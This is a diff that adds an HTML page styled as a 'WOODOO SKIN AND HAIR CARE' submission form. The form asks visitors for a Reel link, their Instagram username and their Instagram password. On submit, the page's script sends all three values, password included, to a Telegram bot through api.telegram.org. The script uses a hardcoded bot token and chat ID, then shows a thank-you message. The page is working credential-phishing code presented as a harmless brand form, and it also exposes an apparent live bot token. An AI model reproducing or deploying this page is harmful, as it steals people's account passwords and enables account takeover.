@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>WOODOO SKIN AND HAIR CARE</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f4;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .container {
+      background-color: #fff;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+      text-align: center;
+      max-width: 400px;
+      width: 100%;
+    }
+    h1 {
+      color: #333;
+      margin-bottom: 20px;
+    }
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      font-size: 16px;
+    }
+    button {
+      background-color: #007bff;
+      color: #fff;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #0056b3;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>WOODOO SKIN AND HAIR CARE</h1>
+    <form id="woodooForm">
+      <input type="text" id="reelLink" placeholder="Enter your Reel Link" required>
+      <input type="text" id="instagramUsername" placeholder="Enter your Instagram Username" required>
+      <input type="password" id="password" placeholder="Enter your Password" required>
+      <button type="submit">Submit</button>
+    </form>
+  </div>
+
+  <script>
+    // Replace YOUR_BOT_TOKEN and YOUR_CHAT_ID with your Telegram bot token and chat ID
+    const botToken = '7878471261:AAHPexKx9Dt0GcnTyQo_z-YD2d0bXzgmekg';
+    const chatId = '5337817984';
+
+    document.getElementById('woodooForm').addEventListener('submit', function (e) {
+      e.preventDefault();
+
+      const reelLink = document.getElementById('reelLink').value;
+      const instagramUsername = document.getElementById('instagramUsername').value;
+      const password = document.getElementById('password').value;
+
+      const message = `New Submission:\nReel Link: ${reelLink}\nInstagram Username: ${instagramUsername}\nPassword: ${password}`;
+
+      // Send data to Telegram bot
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+        .then(response => response.json())
+        .then(data => {
+          alert('Thank you for your submission!');
+          document.getElementById('woodooForm').reset();
+        })
+        .catch(error => {
+          console.error('Error:', error);
+          alert('An error occurred. Please try again.');
+        });
+    });
+  </script>
+</body>
+</html>
